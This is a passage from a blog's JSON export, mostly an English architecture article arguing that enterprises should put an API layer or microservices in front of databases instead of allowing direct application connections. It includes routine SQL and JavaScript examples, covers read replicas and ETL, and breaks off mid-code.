直接資料庫存取很誘人——它簡單且快速。但在企業環境中，風險通常超過好處。 關鍵要點： 直接存取適用於小型、內部、唯讀情境 API 層提供安全性、靈活性和控制 緊密耦合是最大的長期成本 為生產系統從 API 層開始 如果有遺留直接存取，逐步遷移 真正的問題： 不是「我們能直接連接嗎？」而是「我們應該嗎？」 對於大多數企業，答案是：**建立 API 層。**當你需要時，未來的你會感謝你： 變更資料庫架構 添加新應用程式 撤銷被洩露應用程式的存取 擴展以處理更多流量 除錯生產問題 在 API 層的前期投資在安全性、可維護性和可擴展性方面帶來回報。🏗️ 資源 **The Twelve-Factor App：**現代應用程式架構原則 **API Security Best Practices：**OWASP API 安全 **Database Connection Pooling：**效能優化 **Microservices Patterns：**每服務一個資料庫模式","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Enterprise","slug":"Enterprise","permalink":"https://neo01.com/tags/Enterprise/"},{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"Database","slug":"Database","permalink":"https://neo01.com/tags/Database/"}],"lang":"zh-TW"},{"title":"Should Databases Allow Direct Application Connections in Enterprise?","slug":"2023/01/Database-Direct-Access","date":"un55fin55","updated":"un00fin00","comments":false,"path":"2023/01/Database-Direct-Access/","permalink":"https://neo01.com/2023/01/Database-Direct-Access/","excerpt":"Multiple applications connecting directly to your database—convenient or catastrophic? Explore why enterprise architects debate this fundamental design decision.","text":"Your CRM needs customer data. Your analytics dashboard needs the same data. Your mobile app needs it too. The database has everything. Why not let them all connect directly? It seems logical. But in enterprise architecture, this simple decision can make or break your system’s scalability, security, and maintainability. The Question Should multiple applications connect directly to the database in an enterprise environment? The short answer: It depends—but usually no. The long answer: Let’s explore both sides. The Case for Direct Database Access Advantages 1. Simplicity flowchart LR App1[\"📱 Mobile App\"] --> DB[(\"🗄️ Database\")] App2[\"💻 Web App\"] --> DB App3[\"📊 Analytics\"] --> DB style DB fill:#e3f2fd Fewer moving parts No middleware to maintain Straightforward development Quick prototyping 2. Performance Direct connections eliminate intermediary layers: Direct: App → Database (1 hop) API Layer: App → API → Database (2 hops) Lower latency Fewer network calls No serialization overhead 3. Real-Time Data Applications always see the latest data: No cache invalidation issues No synchronization delays Immediate consistency 4. Development Speed Developers can: Query exactly what they need Iterate quickly Use database features directly (stored procedures, triggers) When It Makes Sense Small Organizations: 2-3 applications Single development team Low traffic volume Tight budget Internal Tools: Admin dashboards Reporting tools Data analysis scripts One-off utilities Prototypes: MVP development Proof of concepts Rapid experimentation The Case Against Direct Database Access The Problems 1. Security Nightmare Problem: Every application needs database credentials. flowchart TD subgraph \"Security Risk\" App1[\"📱 Mobile App(DB credentials in code)\"] App2[\"💻 Web App(DB credentials in config)\"] App3[\"📊 Analytics(DB credentials exposed)\"] App4[\"🔧 Admin Tool(Full DB access)\"] end App1 --> DB[(\"🗄️ Database⚠️ Single point of compromise\")] App2 --> DB App3 --> DB App4 --> DB style DB fill:#ffebee Risks: Credential sprawl: Passwords in multiple codebases Mobile apps: Credentials can be extracted from APK/IPA Third-party access: Hard to revoke specific app access Audit nightmare: Can’t track which app made which query Real-World Example: Mobile app decompiled → Database password extracted → Attacker has full database access → All customer data compromised 2. Tight Coupling Problem: Applications depend directly on database schema. Schema Change Impact: -- Rename column ALTER TABLE users RENAME COLUMN email TO email_address; Result: ❌ Mobile app breaks ❌ Web app breaks ❌ Analytics breaks ❌ Admin tool breaks ❌ All need simultaneous updates Deployment Nightmare: Database migration → Must deploy all apps simultaneously → Coordinated downtime required → High risk of failure 3. No Business Logic Layer Problem: Business rules scattered across applications. Example: Discount Calculation Mobile app: 10% discount logic Web app: 15% discount logic (outdated) Analytics: No discount logic (wrong reports) Consequences: Inconsistent behavior Duplicate code Hard to maintain Difficult to audit What About Stored Procedures? Some argue: “Put business logic in stored procedures—problem solved!” The Stored Procedure Approach: -- Centralized discount logic in database CREATE PROCEDURE calculate_order_total( IN user_id INT, IN order_id INT, OUT final_total DECIMAL(10,2) ) BEGIN DECLARE base_total DECIMAL(10,2); DECLARE discount DECIMAL(10,2); DECLARE is_premium BOOLEAN; SELECT total INTO base_total FROM orders WHERE id &#x3D; order_id; SELECT premium INTO is_premium FROM users WHERE id &#x3D; user_id; IF is_premium THEN SET discount &#x3D; base_total * 0.15; ELSEIF base_total &gt; 100 THEN SET discount &#x3D; base_total * 0.10; ELSE SET discount &#x3D; 0; END IF; SET final_total &#x3D; base_total - discount; END; Advantages: ✅ Logic centralized in one place ✅ All apps use same calculation ✅ Consistent behavior guaranteed ✅ Performance (runs close to data) But Serious Drawbacks: 1. Limited Language Features: -- SQL&#x2F;PL-SQL is not designed for complex logic -- No modern language features: -- - No dependency injection -- - Limited error handling -- - No unit testing frameworks -- - No IDE support (compared to Java&#x2F;Python&#x2F;Node.js) 2. Difficult Testing: &#x2F;&#x2F; Application code - easy to test function calculateDiscount(user, order) &#123; if (user.isPremium) return order.total * 0.15; return order.total &gt; 100 ? order.total * 0.10 : 0; &#125; &#x2F;&#x2F; Unit test test(&#39;premium user gets 15% discount&#39;, () &#x3D;&gt; &#123; const user &#x3D; &#123; isPremium: true &#125;; const order &#x3D; &#123; total: 100 &#125;; expect(calculateDiscount(user, order)).toBe(15); &#125;); -- Stored procedure - hard to test -- Need database connection -- Need test data setup -- Slow test execution -- No mocking&#x2F;stubbing 3. Vendor Lock-In: Oracle PL&#x2F;SQL ≠ SQL Server T-SQL ≠ PostgreSQL PL&#x2F;pgSQL -- Migrating databases means rewriting all procedures -- Different syntax, features, limitations 4. Deployment Complexity: Application deployment: - Git commit → CI&#x2F;CD → Deploy → Rollback easy Stored procedure deployment: - Manual SQL scripts - Version control difficult - Rollback risky - No atomic deployment with app code 5. Limited Observability: &#x2F;&#x2F; Application code - full observability function processOrder(order) &#123; logger.info(&#39;Processing order&#39;, &#123; orderId: order.id &#125;); const discount &#x3D; calculateDiscount(order); logger.debug(&#39;Discount calculated&#39;, &#123; discount &#125;); metrics.increment(&#39;orders.processed&#39;); return applyDiscount(order, discount); &#125; -- Stored procedure - limited observability -- Hard to add logging -- Hard to add metrics -- Hard to trace execution -- Hard to debug in production 6. Team Skills: Most developers know: JavaScript, Python, Java, Go Fewer developers know: PL&#x2F;SQL, T-SQL, PL&#x2F;pgSQL → Harder to hire → Harder to maintain → Knowledge silos When Stored Procedures Make Sense: ✅ Data-intensive operations: -- Bulk data processing CREATE PROCEDURE archive_old_orders() BEGIN INSERT INTO orders_archive SELECT * FROM orders WHERE created_at &lt; DATE_SUB(NOW(), INTERVAL 1 YEAR); DELETE FROM orders WHERE created_at &lt; DATE_SUB(NOW(), INTERVAL 1 YEAR); END; ✅ Performance-critical queries: -- Complex aggregations better in database CREATE PROCEDURE get_sales_report(IN start_date DATE, IN end_date DATE) BEGIN SELECT DATE(created_at) as date, COUNT(*) as order_count, SUM(total) as revenue, AVG(total) as avg_order_value FROM orders WHERE created_at BETWEEN start_date AND end_date GROUP BY DATE(created_at); END; ✅ Legacy systems: Already heavily invested in stored procedures Migration cost too high Team expertise in database programming Modern Alternative: Thin Stored Procedures -- Stored procedure only for data access CREATE PROCEDURE get_user_orders(IN user_id INT) BEGIN SELECT * FROM orders WHERE user_id &#x3D; user_id; END; &#x2F;&#x2F; Business logic in application class OrderService &#123; async calculateTotal(userId, orderId) &#123; const orders &#x3D; await db.call(&#39;get_user_orders&#39;, [userId]); const user &#x3D; await db.call(&#39;get_user&#39;, [userId]); &#x2F;&#x2F; Business logic here - testable, maintainable const discount &#x3D; this.calculateDiscount(user, orders); return this.applyDiscount(orders, discount); &#125; &#125; Verdict on Stored Procedures: Stored procedures can centralize logic, but they: ❌ Don’t solve the direct access problem ❌ Create new maintenance challenges ❌ Limit technology choices ⚠️ Should be used sparingly for data-intensive operations ✅ Better: Keep business logic in application layer 4. Performance Bottleneck Problem: Database becomes overwhelmed. Connection Limits: PostgreSQL default: 100 connections MySQL default: 151 connections 10 apps × 20 connections each &#x3D; 200 connections → Database refuses new connections → Applications crash Query Chaos: App 1: SELECT * FROM orders (full table scan) App 2: Complex JOIN across 5 tables App 3: Unoptimized query (missing index) → Database CPU at 100% → All apps slow down 5. No Access Control Problem: Applications have too much access. Typical Setup: -- All apps use same user GRANT ALL PRIVILEGES ON database.* TO &#39;app_user&#39;@&#39;%&#39;; Risks: Analytics tool can DELETE data Mobile app can DROP tables No principle of least privilege Accidental data loss 6. Difficult Monitoring Problem: Can’t track application behavior. Questions you can’t answer: Which app is causing slow queries? Which app is making most requests? Which app accessed sensitive data? Which app caused the outage? The Enterprise Solution: API Layer Architecture Patterns There are two main patterns for placing an API layer in front of databases: Pattern 1: Monolithic API Layer flowchart TD subgraph Apps[\"Applications\"] App1[\"📱 Mobile App\"] App2[\"💻 Web App\"] App3[\"📊 Analytics\"] end subgraph API[\"API Layer\"] Auth[\"🔐 Authentication\"] BL[\"⚙️ Business Logic\"] Cache[\"💾 Cache\"] RateLimit[\"🚦 Rate Limiting\"] end Apps --> Auth Auth --> BL BL --> Cache Cache --> DB[(\"🗄️ Database\")] style API fill:#e8f5e9 style DB fill:#e3f2fd Characteristics: Single API service One database (or shared database) Centralized business logic Simple to start Pattern 2: Microservices (Database-per-Service) flowchart TD subgraph Apps[\"Applications\"] App1[\"📱 Mobile App\"] App2[\"💻 Web App\"] end subgraph Gateway[\"API Gateway\"] GW[\"🚪 Gateway(Routing)\"] end subgraph Services[\"Microservices\"] UserSvc[\"👤 User Service\"] OrderSvc[\"📦 Order Service\"] ProductSvc[\"🏷️ Product Service\"] end subgraph Databases[\"Databases\"] UserDB[(\"👤 User DB\")] OrderDB[(\"📦 Order DB\")] ProductDB[(\"🏷️ Product DB\")] end Apps --> GW GW --> UserSvc GW --> OrderSvc GW --> ProductSvc UserSvc --> UserDB OrderSvc --> OrderDB ProductSvc --> ProductDB style Gateway fill:#fff3e0 style Services fill:#e8f5e9 style Databases fill:#e3f2fd Characteristics: Multiple independent services Each service owns its database Decentralized business logic Complex but scalable Microservices Pattern: Deep Dive Core Principle: Database-per-Service ❌ Anti-Pattern: Shared Database User Service ──┐ ├──&gt; Shared Database Order Service ─┘ Problems: - Tight coupling through schema - Can&#39;t deploy independently - Schema changes break multiple services ✅ Pattern: Database-per-Service User Service ──&gt; User Database Order Service ──&gt; Order Database Benefits: - Loose coupling - Independent deployment - Technology diversity Example Implementation: User Service: &#x2F;&#x2F; user-service&#x2F;api.js const express &#x3D; require(&#39;express&#39;); const app &#x3D; express(); &#x2F;&#x2F; User service owns user database const userDB &#x3D; require(&#39;.&#x2F;db&#x2F;user-db&#39;); app.get(&#39;&#x2F;api&#x2F;users&#x2F;:id&#39;, async (req, res) &#x3D;&gt; &#123; const user &#x3D; await userDB.findById(req.params.id); res.json(user); &#125;); app.post(&#39;&#x2F;api&#x2F;users&#39;, async (req, res) &#x3D;&gt; &#123; const user &#x3D; await userDB.create(req.body); res.json(user); &#125;); app.listen(3001); Order Service: &#x2F;&#x2F; order-service&#x2F;api.js const express &#x3D; require(&#39;express&#39;); const app &#x3D; express(); &#x2F;&#x2F; Order service owns order database const orderDB &#x3D; require(&#39;.&#x2F;db&#x2F;order-db&#39;); app.get(&#39;&#x2F;api&#x2F;orders&#x2F;:id&#39;, async (req, res) &#x3D;&gt; &#123; const order &#x3D; await orderDB.findById(req.params.id); &#x2F;&#x2F; Need user data? Call User Service API const user &#x3D; await fetch(&#96;http:&#x2F;&#x2F;user-service:3001&#x2F;api&#x2F;users&#x2F;$&#123;order.userId&#125;&#96;); res.json(&#123; ...order, user: await user.json() &#125;); &#125;); app.post(&#39;&#x2F;api&#x2F;orders&#39;, async (req, res) &#x3D;&gt; &#123; const order &#x3D; await orderDB.create(req.body); res.json(order); &#125;); app.listen(3002); API Gateway: &#x2F;&#x2F; api-gateway&#x2F;gateway.js const express &#x3D; require(&#39;express&#39;); const &#123; createProxyMiddleware &#125; &#x3D; require(&#39;http-proxy-middleware&#39;); const app &#x3D; express(); &#x2F;&#x2F; Route to appropriate service app.use(&#39;&#x2F;api&#x2F;users&#39;, createProxyMiddleware(&#123; target: &#39;http:&#x2F;&#x2F;user-service:3001&#39;, changeOrigin: true &#125;)); app.use(&#39;&#x2F;api&#x2F;orders&#39;, createProxyMiddleware(&#123; target: &#39;http:&#x2F;&#x2F;order-service:3002&#39;, changeOrigin: true &#125;)); app.use(&#39;&#x2F;api&#x2F;products&#39;, createProxyMiddleware(&#123; target: &#39;http:&#x2F;&#x2F;product-service:3003&#39;, changeOrigin: true &#125;)); app.listen(8080); Benefits of Microservices Pattern: 1. Independent Scaling: User Service: 2 instances (low traffic) Order Service: 10 instances (high traffic) Product Service: 3 instances (medium traffic) Each scales based on its own needs 2. Technology Diversity: &#x2F;&#x2F; User Service - Node.js + PostgreSQL const &#123; Pool &#125; &#x3D; require(&#39;pg&#39;); const pool &#x3D; new Pool(&#123; database: &#39;users&#39; &#125;); # Order Service - Python + MongoDB from pymongo import MongoClient client &#x3D; MongoClient(&#39;mongodb:&#x2F;&#x2F;localhost:27017&#x2F;&#39;) db &#x3D; client[&#39;orders&#39;] &#x2F;&#x2F; Product Service - Java + MySQL DataSource ds &#x3D; new MysqlDataSource(); ds.setURL(&quot;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;products&quot;); 3. Independent Deployment: Deploy User Service v2.0 → Only User Service restarts → Order Service keeps running → Product Service keeps running → No coordinated deployment 4. Fault Isolation: Order Service crashes → Users can still login (User Service) → Users can browse products (Product Service) → Only ordering is down → Partial system availability Challenges of Microservices Pattern: 1. Data Consistency: Problem: No distributed transactions &#x2F;&#x2F; ❌ Can&#39;t do this across services BEGIN TRANSACTION; INSERT INTO users (id, name) VALUES (1, &#39;Alice&#39;); INSERT INTO orders (user_id, total) VALUES (1, 100); COMMIT; &#x2F;&#x2F; User Service and Order Service have separate databases Solution: Saga Pattern &#x2F;&#x2F; Choreography-based saga class OrderService &#123; async createOrder(userId, items) &#123; &#x2F;&#x2F; Step 1: Create order const order &#x3D; await orderDB.create(&#123; userId, items, status: &#39;pending&#39; &#125;); &#x2F;&#x2F; Step 2: Publish event await eventBus.publish(&#39;OrderCreated&#39;, &#123; orderId: order.id, userId, items &#125;); return order; &#125; &#x2F;&#x2F; Listen for events from other services async onPaymentFailed(event) &#123; &#x2F;&#x2F; Compensating transaction await orderDB.update(event.orderId, &#123; status: &#39;cancelled&#39; &#125;); &#125; &#125; class PaymentService &#123; async onOrderCreated(event) &#123; try &#123; await this.chargeCustomer(event.userId, event.total); await eventBus.publish(&#39;PaymentSucceeded&#39;, &#123; orderId: event.orderId &#125;); &#125; catch (error) &#123; await eventBus.publish(&#39;PaymentFailed&#39;, &#123; orderId: event.orderId &#125;); &#125; &#125; &#125; 2. Data Duplication: Problem: Services need data from other services &#x2F;&#x2F; Order Service needs user email for notifications &#x2F;&#x2F; But User Service owns user data &#x2F;&#x2F; ❌ Bad: Query User Service on every order const order &#x3D; await orderDB.findById(orderId); const user &#x3D; await fetch(&#96;http:&#x2F;&#x2F;user-service&#x2F;api&#x2F;users&#x2F;$&#123;order.userId&#125;&#96;); await sendEmail(user.email, order); &#x2F;&#x2F; Slow, creates coupling &#x2F;&#x2F; ✅ Good: Cache user data in Order Service const order &#x3D; await orderDB.findById(orderId); const userCache &#x3D; await orderDB.getUserCache(order.userId); await sendEmail(userCache.email, order); &#x2F;&#x2F; Fast, but data may be stale Solution: Event-Driven Data Replication &#x2F;&#x2F; User Service publishes events class UserService &#123; async updateUser(userId, data) &#123; await userDB.update(userId, data); &#x2F;&#x2F; Publish event await eventBus.publish(&#39;UserUpdated&#39;, &#123; userId, email: data.email, name: data.name &#125;); &#125; &#125; &#x2F;&#x2F; Order Service listens and caches class OrderService &#123; async onUserUpdated(event) &#123; &#x2F;&#x2F; Update local cache await orderDB.updateUserCache(event.userId, &#123; email: event.email, name: event.name &#125;); &#125; &#125; 3. Distributed Queries: Problem: Can’t JOIN across services -- ❌ Can&#39;t do this with microservices SELECT u.name, o.total, p.name as product_name FROM users u JOIN orders o ON u.id &#x3D; o.user_id JOIN products p ON o.product_id &#x3D; p.id; Solution: API Composition or CQRS &#x2F;&#x2F; API Composition: Aggregate in API Gateway app.get(&#39;&#x2F;api&#x2F;order-details&#x2F;:orderId&#39;, async (req, res) &#x3D;&gt; &#123; &#x2F;&#x2F; Call multiple services const [order, user, product] &#x3D; await Promise.all([ fetch(&#96;http:&#x2F;&#x2F;order-service&#x2F;api&#x2F;orders&#x2F;$&#123;req.params.orderId&#125;&#96;), fetch(&#96;http:&#x2F;&#x2F;user-service&#x2F;api&#x2F;users&#x2F;$&#123;order.userId&#125;&#96;), fetch(&#96;http:&#x2F;&#x2F;product-service&#x2F;api&#x2F;products&#x2F;$&#123;order.productId&#125;&#96;) ]); &#x2F;&#x2F; Combine results res.json(&#123; order: await order.json(), user: await user.json(), product: await product.json() &#125;); &#125;); &#x2F;&#x2F; CQRS: Separate read model class OrderReadModel &#123; &#x2F;&#x2F; Denormalized view for queries async getOrderDetails(orderId) &#123; &#x2F;&#x2F; Pre-joined data in read database return await readDB.query(&#96; SELECT * FROM order_details_view WHERE order_id &#x3D; ? &#96;, [orderId]); &#125; &#x2F;&#x2F; Updated by events from all services async onOrderCreated(event) &#123; &#x2F;* update view *&#x2F; &#125; async onUserUpdated(event) &#123; &#x2F;* update view *&#x2F; &#125; async onProductUpdated(event) &#123; &#x2F;* update view *&#x2F; &#125; &#125; When to Use Microservices Pattern: ✅ Large organization: Multiple teams (5+ teams) Each team owns a service Independent release cycles ✅ Different scaling needs: Some features high traffic Some features low traffic Need to scale independently ✅ Technology diversity: Different languages/frameworks Different database types Legacy system integration ✅ Domain complexity: Clear bounded contexts Well-defined service boundaries Mature domain understanding When NOT to Use Microservices: ❌ Small team: &lt; 5 developers Overhead too high Monolith is simpler ❌ Unclear boundaries: Domain not well understood Services change frequently Lots of cross-service calls ❌ Simple application: CRUD operations No complex workflows Monolith is sufficient ❌ Startup/MVP: Need to move fast Requirements change often Premature optimization Migration Path: Monolith to Microservices Phase 1: Monolith with Modules Monolithic API ├── User Module ├── Order Module └── Product Module ↓ Single Database Phase 2: Extract First Service Monolithic API ──&gt; Shared Database ↓ User Service ──&gt; User Database (new) Phase 3: Extract More Services Product Service ──&gt; Product Database Order Service ──&gt; Order Database User Service ──&gt; User Database Phase 4: Retire Monolith API Gateway ├── Product Service ──&gt; Product Database ├── Order Service ──&gt; Order Database └── User Service ──&gt; User Database Best Practices: Start with a monolith Extract services when pain points emerge Use API Gateway for routing Implement service discovery Use event-driven communication Monitor everything Automate deployment Design for failure Monolithic API Layer Benefits 1. Security Centralized Authentication: Mobile App → API (JWT token) Web App → API (OAuth) Analytics → API (API key) API → Database (single secure connection) Benefits: No database credentials in apps Revoke access per application Audit all data access Implement rate limiting Example: &#x2F;&#x2F; Mobile app - no DB credentials const response &#x3D; await fetch(&#39;https:&#x2F;&#x2F;api.example.com&#x2F;users&#39;, &#123; headers: &#123; &#39;Authorization&#39;: &#39;Bearer &#39; + token &#125; &#125;); 2. Loose Coupling Schema Independence: -- Database change ALTER TABLE users RENAME COLUMN email TO email_address; API stays the same: GET &#x2F;api&#x2F;users&#x2F;123 &#123; &quot;email&quot;: &quot;user@example.com&quot; &#x2F;&#x2F; API contract unchanged &#125; Result: ✅ Mobile app works ✅ Web app works ✅ Analytics works ✅ Only API code updated 3. Business Logic Centralization Single Source of Truth: &#x2F;&#x2F; API layer - discount logic in one place function calculateDiscount(user, order) &#123; if (user.isPremium) return order.total * 0.15; if (order.total &gt; 100) return order.total * 0.10; return 0; &#125; Benefits: Consistent behavior across all apps Easy to update rules Single place to test Audit trail 4. Performance Optimization Connection Pooling: 10 apps → API (10 connections) API → Database (5 pooled connections) Instead of: 10 apps × 20 &#x3D; 200 connections Caching: &#x2F;&#x2F; Cache frequent queries app.get(&#39;&#x2F;api&#x2F;products&#39;, async (req, res) &#x3D;&gt; &#123; const cached &#x3D; await redis.get(&#39;products&#39;); if (cached) return res.json(cached); const products &#x3D; await db.query(&#39;SELECT * FROM products&#39;); await redis.set(&#39;products&#39;, products, &#39;EX&#39;, 300); return res.json(products); &#125;); Benefits: Reduced database load Faster response times Better resource utilization 5. Fine-Grained Access Control Per-Application Permissions: &#x2F;&#x2F; Mobile app - read-only if (app &#x3D;&#x3D;&#x3D; &#39;mobile&#39;) &#123; allowedOperations &#x3D; [&#39;READ&#39;]; &#125; &#x2F;&#x2F; Admin tool - full access if (app &#x3D;&#x3D;&#x3D; &#39;admin&#39; &amp;&amp; user.isAdmin) &#123; allowedOperations &#x3D; [&#39;READ&#39;, &#39;WRITE&#39;, &#39;DELETE&#39;]; &#125; &#x2F;&#x2F; Analytics - specific tables only if (app &#x3D;&#x3D;&#x3D; &#39;analytics&#39;) &#123; allowedTables &#x3D; [&#39;orders&#39;, &#39;products&#39;]; &#125; 6. Comprehensive Monitoring Track Everything: &#x2F;&#x2F; Log all API requests app.use((req, res, next) &#x3D;&gt; &#123; logger.info(&#123; app: req.headers[&#39;x-app-name&#39;], user: req.user.id, endpoint: req.path, method: req.method, duration: Date.now() - req.startTime &#125;); &#125;); Insights: Which app is slowest? Which endpoints are most used? Which app is causing errors? Usage patterns per application Hybrid Approach: When to Mix Read-Only Direct Access Scenario: Analytics and reporting tools need complex queries. flowchart LR subgraph Write[\"Write Operations\"] App1[\"📱 Mobile App\"] App2[\"💻 Web App\"] end subgraph Read[\"Read-Only\"] Analytics[\"📊 Analytics\"] Reports[\"📈 Reports\"] end Write --> API[\"🔐 API Layer\"] API --> DB[(\"🗄️ Primary DB\")] DB -.->|Replication| ReadDB[(\"📖 Read Replica\")] Read --> ReadDB style API fill:#e8f5e9 style DB fill:#e3f2fd style ReadDB fill:#fff3e0 Setup: -- Read-only user for analytics CREATE USER &#39;analytics&#39;@&#39;%&#39; IDENTIFIED BY &#39;secure_password&#39;; GRANT SELECT ON database.* TO &#39;analytics&#39;@&#39;%&#39;; -- Connect to read replica -- No impact on production database Benefits: Analytics doesn’t slow down production Complex queries allowed No write access risk Separate monitoring Read Replica vs ETL: Which to Choose? For analytics workloads, you have two main options: Option 1: Read Replica (Real-Time) flowchart LR Prod[(\"🗄️ Production DB\")] -.->|\"ContinuousReplication\"| Replica[(\"📖 Read Replica\")] Analytics[\"📊 Analytics Tool\"] --> Replica style Prod fill:#e3f2fd style Replica fill:#fff3e0 -- Analytics queries run on replica SELECT DATE(created_at) as date, COUNT(*) as orders, SUM(total) as revenue FROM orders WHERE created_at &gt;&#x3D; DATE_SUB(NOW(), INTERVAL 30 DAY) GROUP BY DATE(created_at); Characteristics: ⚡ Real-time or near real-time data (seconds delay) 🔄 Continuous replication 📊 Same schema as production 🎯 Direct SQL queries ⚠️ 'Near Real-Time' Reality CheckRead replicas are NOT truly real-time. There's always replication lag. Typical Replication Lag: Best case: 100ms - 1 second Normal: 1-5 seconds Under load: 10-60 seconds Network issues: Minutes or more What This Means: 12:00:00.000 - Customer places order on production 12:00:00.500 - Replication lag (500ms) 12:00:00.500 - Order appears on read replica 12:00:00.600 - Analytics dashboard queries replica Result: Dashboard shows order 600ms after it happened **Real-World Scenario:** -- Production: Order just created INSERT INTO orders (id, status) VALUES (12345, &#39;pending&#39;); -- Read Replica: 2 seconds later SELECT * FROM orders WHERE id &#x3D; 12345; -- Returns: No results (replication lag) -- 2 seconds later on replica SELECT * FROM orders WHERE id &#x3D; 12345; -- Returns: Order found **When Replication Lag Causes Problems:** 1. **Customer sees stale data:** User: &quot;I just placed an order!&quot; Dashboard: &quot;No orders found&quot; User: &quot;Your system is broken!&quot; 2. **Inconsistent views:** Mobile app (production): 100 orders Dashboard (replica): 98 orders (2 seconds behind) 3. **Business decisions on old data:** Manager: &quot;We only have 5 items in stock&quot; Reality: 0 items (5 sold in last 3 seconds) Manager: &quot;Let&#39;s run a promotion!&quot; Result: Overselling **Monitoring Replication Lag:** -- PostgreSQL SELECT client_addr, state, sync_state, replay_lag, write_lag, flush_lag FROM pg_stat_replication; -- MySQL SHOW SLAVE STATUS\\G -- Look for: Seconds_Behind_Master **Alert on High Lag:** # Prometheus alert - alert: HighReplicationLag expr: mysql_slave_lag_seconds &gt; 10 for: 2m annotations: summary: &quot;Replication lag is &#123;&#123; $value &#125;&#125; seconds&quot; **Acceptable Use Cases Despite Lag:** - ✅ Historical reports (yesterday's sales) - ✅ Trend analysis (last 30 days) - ✅ Dashboards with &quot;Data as of X seconds ago&quot; disclaimer - ✅ Non-critical metrics **Unacceptable Use Cases:** - ❌ Real-time inventory checks - ❌ Fraud detection - ❌ Customer-facing &quot;your order&quot; pages - ❌ Critical business decisions **If you need TRUE real-time:** - Query production database directly (with caution) - Use change data capture (CDC) with streaming - Implement event-driven architecture - Accept the lag and design around it Option 2: ETL to Data Warehouse (Batch) flowchart LR Prod[(\"🗄️ Production DB\")] -->|\"NightlyExtract\"| ETL[\"⚙️ ETL Process\"] ETL -->|\"Transform& Load\"| DW[(\"📊 Data Warehouse\")] Analytics[\"📊 Analytics Tool\"] --> DW style Prod fill:#e3f2fd style ETL fill:#fff3e0 style DW fill:#e8f5e9 # ETL job runs nightly def etl_orders(): # Extract from production orders &#x3D; prod_db.query(&quot;&quot;&quot; SELECT * FROM orders WHERE updated_at &gt;&#x3D; CURRENT_DATE - INTERVAL &#39;1 day&#39; &quot;&quot;&quot;) # Transform for order in orders: order[&#39;revenue&#39;] &#x3D; order[&#39;total&#39;] - order[&#39;discount&#39;] order[&#39;profit_margin&#39;] &#x3D; calculate_margin(order) # Load to warehouse warehouse.bulk_insert(&#39;fact_orders&#39;, orders) Characteristics: 🕐 Scheduled updates (hourly/daily) 🔄 Batch processing 🏗️ Transformed schema (optimized for analytics) 📈 Pre-aggregated data 📅 Batch Processing: Predictable StalenessETL data is intentionally stale—and that's okay. Typical ETL Schedules: Hourly: Data is 0-60 minutes old Daily: Data is 0-24 hours old Weekly: Data is 0-7 days old Example Timeline: Monday 9:00 AM - Customer places order Monday 11:59 PM - ETL job starts Tuesday 12:30 AM - ETL job completes Tuesday 8:00 AM - Analyst views report Data age: ~23 hours old **Why Batch is Better for Analytics:** 1. **Consistent snapshots:** # ETL captures point-in-time snapshot # All data from same moment snapshot_time &#x3D; &#39;2024-01-15 23:59:59&#39; orders &#x3D; extract_orders(snapshot_time) customers &#x3D; extract_customers(snapshot_time) products &#x3D; extract_products(snapshot_time) # All data is consistent # No mid-query changes 2. **No mid-query updates:** Read Replica (live): Start query: 100 orders Mid-query: 5 new orders arrive End query: Inconsistent results Data Warehouse (batch): Start query: 100 orders Mid-query: No changes (static snapshot) End query: Consistent results 3. **Optimized for aggregations:** -- Pre-aggregated in warehouse SELECT date, SUM(revenue) FROM daily_sales_summary -- Already summed WHERE date &gt;&#x3D; &#39;2024-01-01&#39;; -- Returns in 10ms -- vs Read Replica SELECT DATE(created_at), SUM(total) FROM orders -- Must scan millions of rows WHERE created_at &gt;&#x3D; &#39;2024-01-01&#39; GROUP BY DATE(created_at); -- Returns in 30 seconds **When Staleness is Acceptable:** - ✅ Monthly/quarterly reports - ✅ Year-over-year comparisons - ✅ Trend analysis - ✅ Executive dashboards - ✅ Compliance reports **When Staleness is NOT Acceptable:** - ❌ Live operational dashboards - ❌ Real-time alerts - ❌ Customer-facing data - ❌ Fraud detection **Hybrid Solution: Lambda Architecture** Real-time layer (Read Replica): - Last 24 hours of data - Fast queries on recent data - Acceptable lag: seconds Batch layer (Data Warehouse): - Historical data (&gt;24 hours) - Complex analytics - Acceptable lag: hours&#x2F;days Serving layer: - Merges both views - Recent + Historical **Example Implementation:** def get_sales_report(start_date, end_date): today &#x3D; datetime.now().date() # Historical data from warehouse if end_date &lt; today: return warehouse.query( &quot;SELECT * FROM sales_summary WHERE date BETWEEN ? AND ?&quot;, start_date, end_date ) # Recent data from replica historical &#x3D; warehouse.query( &quot;SELECT * FROM sales_summary WHERE date BETWEEN ? AND ?&quot;, start_date, today - timedelta(days&#x3D;1) ) recent &#x3D; replica.query( &quot;SELECT * FROM orders WHERE date &gt;&#x3D; ?&quot;, today ) return merge(historical, recent) Comparison: Factor Read Replica ETL to Data Warehouse Data Freshness Real-time (seconds) Batch (hours/daily) Query Performance Depends on production schema Optimized for analytics Schema Same as production Transformed (star/snowflake) Impact on Production Minimal (separate server) Minimal (scheduled off-peak) Complexity Low High Cost Lower Higher Data Transformation None Extensive Historical Data Limited by retention Unlimited Multiple Sources Single database Multiple databases/APIs When to Use Read Replica: ✅ Real-time dashboards: &#x2F;&#x2F; Live order monitoring SELECT COUNT(*) as active_orders FROM orders WHERE status &#x3D; &#39;processing&#39; AND created_at &gt;&#x3D; NOW() - INTERVAL 1 HOUR; ✅ Operational reporting: Current inventory levels Active user sessions Today’s sales figures System health metrics ✅ Simple analytics: Single data source No complex transformations Production schema works fine ✅ Budget constraints: Small team Limited resources Quick setup needed When to Use ETL/Data Warehouse: ✅ Complex analytics: -- Multi-dimensional analysis SELECT d.year, d.quarter, d.month, p.category, p.brand, c.country, c.region, SUM(f.revenue) as total_revenue, SUM(f.profit) as total_profit FROM fact_sales f JOIN dim_date d ON f.date_key &#x3D; d.date_key JOIN dim_product p ON f.product_key &#x3D; p.product_key JOIN dim_customer c ON f.customer_key &#x3D; c.customer_key GROUP BY d.year, d.quarter, d.month, p.category, p.brand, c.country, c.region; ✅ Multiple data sources: # Combine data from multiple systems def build_customer_360(): # From production DB orders &#x3D; extract_from_postgres() # From CRM API interactions &#x3D; extract_from_salesforce() # From support system tickets &#x3D; extract_from_zendesk() # Combine and load customer_360 &#x3D; merge_data(orders, interactions, 